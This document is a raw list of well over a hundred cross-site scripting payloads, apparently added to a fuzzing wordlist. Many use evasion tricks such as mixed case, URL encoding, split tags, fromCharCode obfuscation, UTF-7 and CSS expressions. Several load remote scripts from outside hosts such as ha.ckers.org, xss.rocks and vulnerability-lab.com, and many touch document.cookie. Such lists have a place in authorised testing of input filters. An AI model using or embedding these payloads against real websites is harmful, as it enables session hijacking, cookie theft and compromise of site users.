+<style>li%20{list-style-image:%20url(\"javascript:alert('xss')\");}<%2fstyle><ul><li>xss
+<iframe id=xss///////onload=alert(/xss/)></iframe>
+<body / onhashchange = alert(1)><a+href = #>clickit
+<ImG Id=xSs sRc=\"&14;JaVaScRiPt:aLeRt('XsS');\">
+-1<img src = \"blah>\" onmouseover = \"document.cookie = true ; \">
+<InPuT TyPe=\"ImAgE\" sRc=\"JaVaScRiPt:aLeRt('XsS');\">
+<img src = \"javascript:alert('crosssitescripting')\"
+<meta%20http-equiv=\"refresh\"%20content=\"0;%20url=http:%2f%2f;url=javascript:alert('xss');\">
+write(1) autofocus>
+-1<img dynsrc = \"javascript:document.cookie = true ; \">
+\"</StYlE><iMg sRc=x oNeRrOr=aLeRt(1)//\">
+>\"<img src = \"mocha:document.cookie = true ; \">
+}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>
+ & <script>document.cookie = true ; < / script>
+<IMG SRC = 'vbscript:msgbox(\"XSS\")'>
+1<sCrIpT >pRoMpT(962477)</sCrIpT>
+<ImG StYlE=\"xSs:eXpR/*xSs*/EsSiOn(aLeRt('XsS'))\">
+<img src=\"blah\"onmouseover=\"document.cookie=true;\">
+-1<ImG SrC=\"bLaH>\" OnMoUsEoVeR=\"dOcUmEnT.CoOkIe=tRuE;\">
+-1<img%20src=\"jav%20ascript:document%2ecookie=true;\">
+<ScRiPt>a=/XsS/
+-1<InPuT TyPe=\"ImAgE\" dYnSrC=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+<IfRaMe iD=XsS \"oNlOaD=AlErT(/xSs/)></iFrAmE>
+<div onmouseover = \"alert('xss') ; \">,
+<input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
+\"javascript:%2f%2f\"%2f><%2fhead><body><a%20href=\"%2f%2e%20%2f,alert(1)%2f%2f
+>\"<img src=\"javascript:document.cookie=true;\">
+-1<StYlE>Li {LiSt-sTyLe-iMaGe: UrL(\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\");</StYlE><uL><lI>CrOsSsItEsCrIpTiNg
+<iframe src=http://test.de>
+<b><script<b>< / b><alert(1)< / script < / b>< / b>
+\"><svg onload=alert(1)>
+<script>confirm(0) ; < / script>
+<script>document%2ecookie=true;%2f%2f<<%2fscript>
+-1<meta http-equiv=\"set-cookie\" content=\"userid=<script>document.cookie=true</script>\">
+-1<img src=\"jav ascript:document.cookie=true;\">
+<XsS StYlE=\"xSs:eXpReSsIoN(AlErT('xSs'))\">
+<scr<script>ipt>alert(1)<%2fscr<script>ipt>
+\\\";alert('XSS');//
+<ImG SrC=JaVaScRiPt:aLeRt(sTrInG.FrOmChArCoDe(88,83,83))>
+<ScRiPt>aLeRt('XsSyA')</sCrIpT>
+<IMG SRC = \"jav ascript:alert('XSS') ; \">
+<style>li {list-style-image: url(\"javascript:document.cookie = true ; \") ; < / style><ul><li>crosssitescripting
+>\"<BaSe hReF=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;//\">
+<style>body{-moz-binding:url(\"http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescriptingmoz%2exml#crosssitescripting\")}<%2fstyle>
+-1<img src=\" javascript:document.cookie=true;\">
+>\"<DiV StYlE=\"wIdTh: ExPrEsSiOn(dOcUmEnT.CoOkIe=tRuE);\">
+-1<style>li%20{list-style-image:%20url(\"javascript:document%2ecookie=true;\");<%2fstyle><ul><li>crosssitescripting
+<script>alert( / xss / .source)< / script>
+>\"<a href=\"javascript#document.cookie=true;\">
+<body background = \"javascript:alert('crosssitescripting')\">
+<base href=\"javascript:alert('crosssitescripting');//\">
+<style>li {list-style-image: url(\"javascript:alert('xss')\");}</style><ul><li>xss
+<ImG SrC=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+\"--><img%20src=x%20onerror=alert(1)%2f%2f\">
+<head><meta%20http-equiv=\"content-type\"%20content=\"text%2fhtml;%20charset=utf-7\">%20<%2fhead>+adw-script+ad4-alert('xss');+adw-%2fscript+ad4-
+<img%20lowsrc=\"javascript:document%2ecookie=true;\">
+-1<xml id = i><x><c><![cdata[<img src = \"javas]]<![cdata[cript:document.cookie = true ; \">]]< / c>< / x>< / xml><span datasrc = #i datafld = c dataformatas = html>< / span>
+<meta http-equiv = \"refresh\" content = \"0 ; url = javascript:alert('crosssitescripting') ; \">
+<style>li%20{list-style-image:%20url(\"javascript:alert('xss');<%2fstyle><ul><li>xss
+\";alert('crosssitescripting');%2f%2f
+>\"<frameset><frame%20src=\"javascript:document%2ecookie=true;\"><%2fframeset>
+<img src = 'vbscript:msgbox(\"crosssitescripting\")'>
+aLeRt(1)><iNpUt aUtOfOcUs>
+<DiV StYlE=\"wIdTh: ExPrEsSiOn(aLeRt('XsS'));\">
+<script \"a='>'\" id=xss src=\"http://ha.ckers.org/xss.js\"></script>
+<script>alert(document%2ecookie)<%2fscript>
+-1<img%20src=\"blah\"onmouseover=\"document%2ecookie=true;\">
+<img%20src=`javascript:alert(\"rm'crosssitescripting'\")`>
+>\"<ImG SrC=&{DoCuMeNt.cOoKiE=TrUe;};>
+-1<ImG SrC=\"lIvEsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+<<script>alert(\"xss\") ;  /  / << / script>
+>\"<iframe src=http://vulnerability-lab.com></iframe>
+<IMG%20SRC=\"jav%20ascript:alert('XSS');\">
+>\"<body onload!#$% & ()*~+-_.,: ; ?@[ /  | \\\\]^` = document.cookie = true ; >
+sCrIpTaLeRt(cRoSsSiTeScRiPtInG)/sCrIpT
+<ImG Id=xSs sRc=jAvAsCrIpT:AlErT(StRiNg.fRoMcHaRcOdE(88,83,83))>
+<iframe src = http: /  / vulnerability-lab.com / index.html <
+>\"<style>li {list-style-image: url(\"javascript:document.cookie=true;\");</style><ul><li>crosssitescripting
+scriptdocument%2ecookie=true;%2fscript
+<FRAMESET><FRAME SRC = \"javascript:alert('XSS') ; \">< / FRAMESET>
+<img dynid=xss src=\"javascript:alert('xss')\">
+<<script>alert(\"xss\");%2f%2f<<%2fscript>
+<IfRaMe sRc=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\"></IfRaMe>
+>\"<input type=\"image\" src=\"javascript:document.cookie=true;\">
+test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
+<body onload!#$% & ()*~+-_.,: ; ?@[ /  | \\\\]^` = alert(\"crosssitescripting\")>
+aLeRt(1)><bR><bR><bR><bR><bR><bR>...<Br><Br><Br><Br><InPuT AuToFoCuS>
+<script>alert(document.cookie)</script><div style=\"1@gmail.com
+<img \"\"\"><script>alert(\"crosssitescripting\")</script>\">
+<BoDy oNlOaD=AlErT('cRoSsSiTeScRiPtInG')>
+<!--#exec cmd = \" / bin / echo '<scr'\"--><!--#exec cmd = \" / bin / echo 'ipt src = http: /  / vulnerability-lab.com / crosssitescripting.js>< / script>'\"-->
+\"javascript:alert(1)\">x<%2fbutton>
+<ImG StYlE=\"cRoSsSiTeScRiPtInG:ExPr/*CrOsSsItEsCrIpTiNg*/EsSiOn(aLeRt('CrOsSsItEsCrIpTiNg'))\">
+<img+src = x+onerror = prompt(1) ; >
+\"import\" href = \"test.svg\"  / >
+<img id=xss src=\" javascript:alert('xss');\">
+}</StYlE><sCrIpT>A=EvAl;b=aLeRt;a(b(/XsS/.sOuRcE));</ScRiPt>
+<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+>\" & <script>document.cookie = true ; < / script>
+<a%20href=\"about:<script>document%2ecookie=true;<%2fscript>\">
+<BuTtOn.oNcLiCk=\"AlErT(StRiNg.fRoMcHaRcOdE(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));\">StRiNg:fRoM.ChAr.cOdE</bUtToN></BoDy></hTmL>
+>\"<input type=\"image\" dynsrc=\"javascript:document.cookie=true;\">
+<script>alert(document%2ecookie)<%2fscript>%20<script>alert(document%2ecookie)<%2fscript>@gmail%2ecom
+javascript:alert(1)%2f%2f
+-1<ScRiPt>dOcUmEnT.CoOkIe=tRuE;//--></sCrIpT>
+<div style=\"background-image: url(javascript:alert('xss'));\">
+<IfRaMe iD=XsS / \"oNlOaD=AlErT(/xSs/)></iFrAmE>
+>\"<div style=\"width: expression(document.cookie=true;);\">
+<MeTa hTtP-EqUiV=\"rEfReSh\" CoNtEnT=\"0;uRl=jAvAsCrIpT:AlErT('cRoSsSiTeScRiPtInG');\">
+'' ; !--\"<crosssitescripting> =  & {()}
+<MeTa hTtP-EqUiV=\"rEfReSh\" CoNtEnT=\"0;uRl=jAvAsCrIpT:AlErT('xSs');\">
+<OBJECT classid = clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name = url value = javascript:alert('XSS')>< / OBJECT>
+-1<TaBlE BaCkGrOuNd=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<ImG Id=xSs sRc='VbScRiPt:mSgBoX(\"xSs\")'>
+>\"<base href=\"javascript:document.cookie=true;//\">
+>\"<IfRaMe sRc=hTtP://VuLnErAbIlItY-LaB.CoM></IfRaMe>
+<StYlE><!--</StYlE><sCrIpT>DoCuMeNt.cOoKiE=TrUe;//--></ScRiPt>
+<script>document.write(\"xss\");</script>
+\"x\" onerror=\"alert(1)\"></picture>
+<style>body{-moz-binding:url(\"http: /  / ha.ckers.org / xssmoz.xml#xss\")}< / style>
+<BODY%20BACKGROUND=\"javascript:alert('XSS')\">
+-1<meta%20http-equiv=\"set-cookie\"%20content=\"userid=<script>document%2ecookie=true<%2fscript>\">
+<LaYeR SrC=\"hTtP://VuLnErAbIlItY-LaB.CoM/ScRiPt.hTmL\"></lAyEr>
+<SCRIPT SRC = http: /  / xss.rocks / xss.js?<B>
+5rt(0);'>rhainfosec
+alert(1)><input%20autofocus>
